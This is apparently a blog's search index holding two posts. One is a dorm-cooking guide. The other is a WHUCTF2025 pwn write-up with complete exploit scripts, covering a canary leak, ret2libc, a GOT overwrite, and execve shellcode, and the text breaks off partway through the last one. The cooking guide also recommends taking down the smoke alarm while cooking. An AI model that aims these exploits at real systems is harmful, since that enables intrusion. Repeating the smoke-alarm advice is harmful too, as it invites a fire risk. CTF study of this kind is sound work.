<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>哈基地烹饪指南</title>
    <link href="/2025/07/10/%E5%93%88%E5%9F%BA%E5%9C%B0%E7%83%B9%E9%A5%AA%E6%8C%87%E5%8D%97/"/>
    <url>/2025/07/10/%E5%93%88%E5%9F%BA%E5%9C%B0%E7%83%B9%E9%A5%AA%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="哈基地烹饪指南"><a href="#哈基地烹饪指南" class="headerlink" title="哈基地烹饪指南"></a>哈基地烹饪指南</h1><blockquote><p>本指南中，<strong>做饭</strong>泛指制作各种食物的行为，包括煎炒烹炸、烘焙等等，不单指做米饭。</p></blockquote><p>哈基地食堂<strong>昂贵</strong>且比较难吃，做饭可以<strong>完美解决难吃的问题</strong>，并能把每顿饭的成本控制在<strong>10元之内</strong>。因此，做饭成为哈基人的重要选择。本指南将帮助大家从0开始做出好吃的饭菜！<br>本指南将包含<strong>厨具与调料置办、用电安全与查寝应对、购买食材、与室友协作、基础知识、食谱、原理分析</strong>，尽量把我在这方面的经验倾囊相授，也欢迎大家帮助完善这份指南！</p><h2 id="厨具与调料的置办"><a href="#厨具与调料的置办" class="headerlink" title="厨具与调料的置办"></a>厨具与调料的置办</h2><p>哈基地的各种条件使我们不能使用灶火、电磁炉等手段做饭，这里给大家推荐一些能用的厨具，顺带把该准备的零碎物件和调料也叨咕一下。</p><h3 id="电炒锅"><a href="#电炒锅" class="headerlink" title="电炒锅"></a>电炒锅</h3><p>电炒锅将是你做饭的主力，它拥有你烹饪所需的所有功能，煎炒焖炸卤炖都能胜任。电炒锅要注意两个性能：<strong>容量</strong>和<strong>功率</strong>。容量在<strong>3.5L~5L</strong>，功率在<strong>1200W~2000W</strong>比较合适，太大太小都有相应的风险。另外不粘锅性能也比较重要，但现在几乎所有锅都有这个性能。其它的功能都是噱头，无须理会，挑便宜的就行。我个人使用的是苏泊尔3.5L的电炒锅，功率1600W，已经能够胜任几乎所有的烹饪场景。</p><h3 id="蒸屉"><a href="#蒸屉" class="headerlink" title="蒸屉"></a>蒸屉</h3><p>用来蒸，以及热剩饭菜。电炒锅有时会附赠蒸屉，如果附赠就不要再买了。<br>买蒸屉时，问好或者量好**电炒锅的内外径(直径)**，根据这个来买配套的蒸屉。另外注意尽量不买铁制的蒸屉，会被烫伤QAQ。</p><h3 id="空气炸锅"><a href="#空气炸锅" class="headerlink" title="空气炸锅"></a>空气炸锅</h3><p>电炒锅只能油炸，而油炸是相当费油的，成本夸张。因此，空气炸锅将成为你炸东西的主力工具。<br><em>我们的空气炸锅是舍友邮过来的，我没有购买经验，有大佬有经验的欢迎在issue补充~</em></p><h3 id="电饭锅"><a href="#电饭锅" class="headerlink" title="电饭锅"></a>电饭锅</h3><p><strong>没必要买</strong>，米饭可以在食堂打包，并不贵，而且食堂的米饭也不难吃。自己买米煮饭是非常麻烦的，既容易导致功率超限，又要自己搬运大米，非常麻烦。而且电饭锅能做的事情电炒锅也能做。当然，电饭锅可以更方便地做一些料理，其实也可以考虑购买。</p><h3 id="抽油烟机"><a href="#抽油烟机" class="headerlink" title="抽油烟机"></a>抽油烟机</h3><p>也没啥大必要，但你可以搜“小型抽油烟机”买一个，至少你炒菜的时候不会被呛死了。</p><h3 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h3><p>必须买<strong>大菜刀</strong>，你可以另外买厨师刀、水果刀、小刀，但大菜刀必须有。材质最好是买钢的，比较锋利、结实。陶瓷刀也不错，但是陶瓷刀锋利度差一些，切肉的时候可能会比较费劲。另外注意，<strong>尽量买杂牌子菜刀</strong>，名牌菜刀往往华而不实，当然如果你是富哥就当我没说。</p><h3 id="菜板"><a href="#菜板" class="headerlink" title="菜板"></a>菜板</h3><p>菜板就一个注意点：<strong>不要买太大的</strong>。一般最小号的就够用。另外个人建议用竹制或木制菜板，手感比较好。</p><h3 id="小工具-gadgets"><a href="#小工具-gadgets" class="headerlink" title="小工具(gadgets)"></a>小工具(gadgets)</h3><p>这些小工具也是非常重要的，没有它们，你做饭将会非常麻烦！</p><h4 id="锅铲"><a href="#锅铲" class="headerlink" title="锅铲"></a>锅铲</h4><p>一般来说电炒锅都会送，但你可以再买个大点的，不然崩锅的油和咖喱会教你做人。<strong>必须买木制或竹制</strong>，钢的会刮坏不沾涂层，橡胶的会非常难用。</p><h4 id="汤勺与漏勺"><a href="#汤勺与漏勺" class="headerlink" title="汤勺与漏勺"></a>汤勺与漏勺</h4><p>买大点，材质只要不是塑料就行。</p><h4 id="盆"><a href="#盆" class="headerlink" title="盆"></a>盆</h4><p>买304不锈钢盆，直径16cm~24cm，在这个范围内越大越好。</p><h4 id="碗、盘子、勺子、筷子"><a href="#碗、盘子、勺子、筷子" class="headerlink" title="碗、盘子、勺子、筷子"></a>碗、盘子、勺子、筷子</h4><p>除了盘子，其它的都是必须买的。做一个菜平均会使用1~2个碗或盆，加上一个盛菜的盘子，可以根据实际情况准备足量的这些东西。勺子筷子则都是重要的工具，尤其是筷子，手上有双筷子，你做菜会顺手很多。<br>材质上，我个人惯用<strong>小麦秸秆</strong>材质的，因为不会碎，但小麦秸秆有一种油油的触感，洗碗的时候很难判断洗干净没，当然如果鼻子灵的话可以闻闻看干不干净。<strong>陶瓷</strong>的也可以，但要做好运输时打碎的心理准备。</p><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><p>这都是必要的，但没啥挑选技巧，挑便宜的买就行。</p><ul><li>切丝神器</li><li>削皮刀</li><li>保鲜膜</li><li>调料盒(4格，放盐、十三香、糖、淀粉)</li></ul><h3 id="不必要的小工具"><a href="#不必要的小工具" class="headerlink" title="不必要的小工具"></a>不必要的小工具</h3><p>以下这些可以买，但必要性不大：</p><ul><li>硅胶刮刀(烘焙用)</li><li>喷油壶(空气炸锅用)</li><li>烹饪刷子</li></ul><h3 id="调料"><a href="#调料" class="headerlink" title="调料"></a>调料</h3><p>这里只列举应该买的调料，调料的作用请查看<em>原理分析</em>部分。<br>括号里标注推荐的品牌。</p><h4 id="必备"><a href="#必备" class="headerlink" title="必备"></a>必备</h4><p>盐、食用油(最好用大豆油，推荐金龙鱼)、白糖、淀粉、黑胡椒粉、葱姜蒜(葱最好用大葱)。</p><h4 id="中餐必备"><a href="#中餐必备" class="headerlink" title="中餐必备"></a>中餐必备</h4><p>十三香(必须买王守义十三香)、生抽(海天&#x2F;厨邦)、老抽(海天)、蚝油(海天)、山西陈醋(水塔)、料酒(王致和)、提现料三选一{松鲜鲜(松鲜鲜牌或莲花牌)、鸡精(太太乐)、味精(莲花)。个人建议选用松鲜鲜，味道更好}。</p><h4 id="西餐必备"><a href="#西餐必备" class="headerlink" title="西餐必备"></a>西餐必备</h4><p>黄油(安佳)、沙拉酱(丘比，原味&#x2F;香甜味自选，新手推荐原味)、欧芹大蒜盐、淡奶油(雀巢)、培根。</p><h4 id="选购"><a href="#选购" class="headerlink" title="选购"></a>选购</h4><p>老干妈、白醋、番茄酱(亨氏)、芝士(做三明治面包用芝士片，披萨、焗饭用马苏里拉)、香菇酱(仲景，此乃我最爱的下饭神器)、黄豆酱……</p><h2 id="用电安全与查寝应对"><a href="#用电安全与查寝应对" class="headerlink" title="用电安全与查寝应对"></a>用电安全与查寝应对</h2><h3 id="用电安全"><a href="#用电安全" class="headerlink" title="用电安全"></a>用电安全</h3><p><strong>没有什么比用电安全更重要！</strong>如果你把寝室玩着火了，你就完蛋了！请务必确保用电安全！<br>注意以下几点！</p><ol><li>切勿同时使用多种电厨具，比如同时用电炒锅和空气炸锅</li><li>锅只要通了电，必须有人时刻看着，人走必须断电！</li><li>绝对禁止烧干锅！也就是说，锅里啥也没有的时候禁止通电开火！</li><li>一旦出现糊味，立刻断电检查糊味来源，排查安全隐患！</li></ol><h3 id="应付查寝"><a href="#应付查寝" class="headerlink" title="应付查寝"></a>应付查寝</h3><h4 id="烟雾报警器"><a href="#烟雾报警器" class="headerlink" title="烟雾报警器"></a>烟雾报警器</h4><p>这玩意可以摘下来，防止你做饭的时候报警。查寝的时候记得安回去。</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>查寝的时候把厨具、刀、菜板、碗筷啥的都藏起来，调料也要藏，不放在明面上就行。**辅导员只是表面上不让做饭，这是为大家的安全着想，但暗地里其实是允许大家做饭的(在安全的前提下)**。</p><h2 id="购买食材"><a href="#购买食材" class="headerlink" title="购买食材"></a>购买食材</h2><p><em>食材存储技巧在“基础知识”一栏</em><br>哈基地交通不便，一般只考虑这几种方法：</p><h3 id="网购"><a href="#网购" class="headerlink" title="网购"></a>网购</h3><p>可以长途运输的深加工食品、奶类、调料都建议网购，比如芝士、培根、淡奶油、十三香等。</p><h3 id="多多买菜"><a href="#多多买菜" class="headerlink" title="多多买菜"></a>多多买菜</h3><p>微信拼多多小程序可以找到。次日下午去菜鸟自提，适用蔬菜水果、鸡蛋。不建议在此购买鲜肉，一是容易坏，二是品控不严。</p><h3 id="中百仓储-恒大城市广场店"><a href="#中百仓储-恒大城市广场店" class="headerlink" title="中百仓储(恒大城市广场店)"></a>中百仓储(恒大城市广场店)</h3><p>线下商超，适合需要立即使用的食品，以及鲜肉(猪肉、牛肉)。<br>距离哈基地6公里左右，是个大型商超，打车单程12r左右。考虑到交通成本高，建议一次买大量食材，鲜肉丢到冷冻层是不怕坏的。</p><h2 id="与室友协作"><a href="#与室友协作" class="headerlink" title="与室友协作"></a>与室友协作</h2><p>一次做多份饭，既可以卖舍友人情，又可以有效降低成本，还可以把刷碗洗锅的杂活推给室友，美哉美哉。<br>你可以收集舍友的意愿：愿意吃的一起平摊厨具钱；不愿意吃的，让他用厨具和调料的时候付一定的钱就可以了。当然如果你很富并且愿意请客，也可以自己掏厨具钱。<br><strong>注意</strong>，AA摊钱的时候，菜钱的计算是比较复杂的，我建议这个账本统一由一个人管理(这个人最好是你们的厨子)，这样比较方便。当然不要让厨子和记账的白干活，可以考虑给他们合理的劳动费用，或者大家分配任务，比如3个人吃饭，一个厨子，一个管账，一个刷碗收拾残局，尽量保证公平。</p><hr><p>如果你会做饭，那么到这里，本指南对你来说就完结了。当然你也可以查看下面的食谱和原理分析，可能对你有所帮助。</p><hr><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="食材的储存"><a href="#食材的储存" class="headerlink" title="食材的储存"></a>食材的储存</h3><p>待更新……</p><h3 id="调料的基本特性与用量"><a href="#调料的基本特性与用量" class="headerlink" title="调料的基本特性与用量"></a>调料的基本特性与用量</h3><p>待更新……</p><h3 id="烹饪技法"><a href="#烹饪技法" class="headerlink" title="烹饪技法"></a>烹饪技法</h3><p>待更新……</p><h2 id="食谱"><a href="#食谱" class="headerlink" title="食谱"></a>食谱</h2><h3 id="中餐"><a href="#中餐" class="headerlink" title="中餐"></a>中餐</h3><p>待更新……</p><h3 id="西餐"><a href="#西餐" class="headerlink" title="西餐"></a>西餐</h3><p>待更新……</p><h3 id="糕点、甜品"><a href="#糕点、甜品" class="headerlink" title="糕点、甜品"></a>糕点、甜品</h3><p>待更新……</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><blockquote><p>pwn手的执念罢了。什么都想深究一下原理，就连做饭也是……</p></blockquote><h3 id="调料的作用"><a href="#调料的作用" class="headerlink" title="调料的作用"></a>调料的作用</h3><p>待更新……</p><h3 id="食材的口感与味道"><a href="#食材的口感与味道" class="headerlink" title="食材的口感与味道"></a>食材的口感与味道</h3><p>待更新……</p><h3 id="温度对菜肴的影响"><a href="#温度对菜肴的影响" class="headerlink" title="温度对菜肴的影响"></a>温度对菜肴的影响</h3><p>待更新……</p><h3 id="研发菜肴的方法"><a href="#研发菜肴的方法" class="headerlink" title="研发菜肴的方法"></a>研发菜肴的方法</h3><p>待更新……</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>WHUCTF2025 pwn wp</title>
    <link href="/2025/03/31/WHUCTF2025-pwn-wp/"/>
    <url>/2025/03/31/WHUCTF2025-pwn-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="repeater-handout"><a href="#repeater-handout" class="headerlink" title="repeater_handout"></a>repeater_handout</h1><p>首先常规泄露canary，调试发现栈上存的返回地址是libc上的地址，可以用来leak libc。接下来常规ret2libc即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    author: powchan</span><br><span class="hljs-string">    time: 2025-03-29 09:15:01</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>filename = <span class="hljs-string">&quot;pwn_patched&quot;</span><br>libcname = <span class="hljs-string">&quot;/home/zhangjuncpp/.config/cpwn/pkgs/2.35-0ubuntu3.9/amd64/libc6_2.35-0ubuntu3.9_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>host = <span class="hljs-string">&quot;125.220.147.47&quot;</span><br>port = <span class="hljs-number">49216</span><br>elf = context.binary = ELF(filename)<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&quot;n\n&quot;</span>*<span class="hljs-number">33</span>+<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(0x1189)</span><br><span class="hljs-string">b *$rebase(0x1209)</span><br><span class="hljs-string">set debug-file-directory /home/zhangjuncpp/.config/cpwn/pkgs/2.35-0ubuntu3.9/amd64/libc6-dbg_2.35-0ubuntu3.9_amd64/usr/lib/debug</span><br><span class="hljs-string">set directories /home/zhangjuncpp/.config/cpwn/pkgs/2.35-0ubuntu3.9/amd64/glibc-source_2.35-0ubuntu3.9_all/usr/src/glibc/glibc-2.35</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.P:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br>    <span class="hljs-keyword">elif</span> args.R:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br><br>io = start()<br>menu = <span class="hljs-string">b&quot;choose your option: \n1. input\n2. repeat\n3. exit\n&quot;</span><br>io.sendlineafter(menu, <span class="hljs-string">b&quot;1&quot;</span>)<br>pause()<br>io.send(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">24</span>+<span class="hljs-string">b&quot;b&quot;</span>)<br>io.sendlineafter(menu, <span class="hljs-string">b&quot;2&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">24</span>)<br>canary = u64(io.recv(<span class="hljs-number">8</span>))-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;b&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;canary: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&quot;</span>)<br>io.sendlineafter(menu, <span class="hljs-string">b&quot;1&quot;</span>)<br>pause()<br>io.send(<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">24</span>+p64(canary+<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;b&quot;</span>))+<span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">8</span>)<br>io.sendlineafter(menu, <span class="hljs-string">b&quot;2&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">8</span>)<br>leak = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>libc_base = leak - <span class="hljs-number">0x29d90</span><br><br>pop_rdi = libc_base + <span class="hljs-number">0x2a3e5</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>payload = <span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">24</span> + p64(canary)+<span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span><br>payload += p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)<br><br>io.sendlineafter(menu, <span class="hljs-string">b&quot;1&quot;</span>)<br>pause()<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h1><p>通过选项5和6的负溢出可以造成一定范围内地址读写，刚好可以读写到<code>printf</code>的got表项，利用vm中的运算指令，可以通过读取printf地址再根据偏移计算system地址的方式，覆写printf的got至<code>system</code>，再把printf输出的那个字符串修改成sh即可get shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    author: powchan</span><br><span class="hljs-string">    time: 2025-03-29 09:07:59</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>filename = <span class="hljs-string">&quot;pwn_patched&quot;</span><br>libcname = <span class="hljs-string">&quot;/home/zhangjuncpp/.config/cpwn/pkgs/2.35-0ubuntu3.9/amd64/libc6_2.35-0ubuntu3.9_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>host = <span class="hljs-string">&quot;125.220.147.47&quot;</span><br>port = <span class="hljs-number">49304</span><br>elf = context.binary = ELF(filename)<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&quot;n\n&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(0x185c)</span><br><span class="hljs-string">b *$rebase(0x19A1)</span><br><span class="hljs-string">b *$rebase(0x12ae)</span><br><span class="hljs-string">set debug-file-directory /home/zhangjuncpp/.config/cpwn/pkgs/2.35-0ubuntu3.9/amd64/libc6-dbg_2.35-0ubuntu3.9_amd64/usr/lib/debug</span><br><span class="hljs-string">set directories /home/zhangjuncpp/.config/cpwn/pkgs/2.35-0ubuntu3.9/amd64/glibc-source_2.35-0ubuntu3.9_all/usr/src/glibc/glibc-2.35</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">vm</span><br><span class="hljs-string">output+0x80 -&gt; strcat&#x27;s str</span><br><span class="hljs-string">output+0x40 储存size</span><br><span class="hljs-string">size_sub1 -&gt; size-1, 返回被删除的字符的指针</span><br><span class="hljs-string"></span><br><span class="hljs-string">5 -&gt; 负溢出</span><br><span class="hljs-string">7 -&gt; 末字符++</span><br><span class="hljs-string">8 -&gt; 末字符--</span><br><span class="hljs-string">0x11,12 -&gt; jump to</span><br><span class="hljs-string">0x10, i负溢出</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>log.success(<span class="hljs-string">f&quot;filename: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&quot;system&quot;</span>]-libc.sym[<span class="hljs-string">&quot;printf&quot;</span>])&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.P:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br>    <span class="hljs-keyword">elif</span> args.R:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br><br>io = start()<br><br>payload = <span class="hljs-string">b&quot;\x01&quot;</span>+ p8(<span class="hljs-number">0x70</span>)+ <span class="hljs-string">b&quot;\x05&quot;</span>+p8(<span class="hljs-number">0x80</span>)<br>payload += <span class="hljs-string">b&quot;\x01\x07\x06\x81\x03&quot;</span>+<span class="hljs-string">b&quot;\x05&quot;</span>+p8(<span class="hljs-number">0x81</span>)<br>payload+=  <span class="hljs-string">b&quot;\x01\x01\x06\x82\x04&quot;</span>+<span class="hljs-string">b&quot;\x05&quot;</span>+p8(<span class="hljs-number">0x82</span>)<br>payload += <span class="hljs-string">b&quot;\x01s&quot;</span>+ <span class="hljs-string">b&quot;\x05&quot;</span>+p8(<span class="hljs-number">0x0</span>)+ <span class="hljs-string">b&quot;\x01h&quot;</span>+ <span class="hljs-string">b&quot;\x05&quot;</span>+p8(<span class="hljs-number">0x1</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;input length: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)).encode())<br>io.sendafter(<span class="hljs-string">b&quot;input code: &quot;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="shell-for-shell"><a href="#shell-for-shell" class="headerlink" title="shell_for_shell"></a>shell_for_shell</h1><p>给了shellcode，但寄存器全部清零，禁止输入syscall。由于没开pie，可以直接通过plt表调用函数(在shellcode里就是用call plt地址)。  </p><h3 id="解法1-重read"><a href="#解法1-重read" class="headerlink" title="解法1(重read)"></a>解法1(重read)</h3><p>这里调用<code>mprotect</code>修改当前内存段的权限为7并利用<code>read</code>函数重新读取shellcode来执行syscall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br><br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-built_in">print</span>(e.plt[<span class="hljs-string">&quot;mprotect&quot;</span>])<br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br>io = gdb.debug(<span class="hljs-string">&quot;./pwn&quot;</span>, <span class="hljs-string">&quot;&quot;&quot;b main</span><br><span class="hljs-string">               b *(0x4011AF)</span><br><span class="hljs-string">               &quot;&quot;&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;125.220.147.47&quot;,49385)</span><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;mov rbp, 0x404500</span><br><span class="hljs-string">    mov rsp, rbp</span><br><span class="hljs-string">    lea r15, [rip+0xe00]</span><br><span class="hljs-string">    sub r15, 0xe16</span><br><span class="hljs-string">    mov rdi, r15</span><br><span class="hljs-string">    mov rsi, 0x1000</span><br><span class="hljs-string">    mov rdx, 0x7</span><br><span class="hljs-string">    mov rax, 0x401070</span><br><span class="hljs-string">    call rax</span><br><span class="hljs-string">    mov rsi, r15</span><br><span class="hljs-string">    add rsi, 0x86</span><br><span class="hljs-string">    mov rdi, 0</span><br><span class="hljs-string">    mov rdx, 0x100</span><br><span class="hljs-string">    mov rax, 0x401050</span><br><span class="hljs-string">    call rax</span><br><span class="hljs-string">    /* push syscall number */</span><br><span class="hljs-string">    push 0x68</span><br><span class="hljs-string">    mov rax, 0x732f2f2f6e69622f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="hljs-string">    /* push b&#x27;sh\x00&#x27; */</span><br><span class="hljs-string">    push 0x1010101 ^ 0x6873</span><br><span class="hljs-string">    xor dword ptr [rsp], 0x1010101</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    push rsi /* null terminate */</span><br><span class="hljs-string">    push 8</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    add rsi, rsp</span><br><span class="hljs-string">    push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push SYS_execve /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = <span class="hljs-string">b&quot;\x00\xc0&quot;</span>+asm(shellcode)<br><span class="hljs-built_in">print</span>(payload)<br>io.send(payload)<br>pause()<br>io.send(asm(<span class="hljs-string">&quot;syscall&quot;</span>))<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="解法2-自修改"><a href="#解法2-自修改" class="headerlink" title="解法2(自修改)"></a>解法2(自修改)</h3><p>这里修改权限后自修改代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 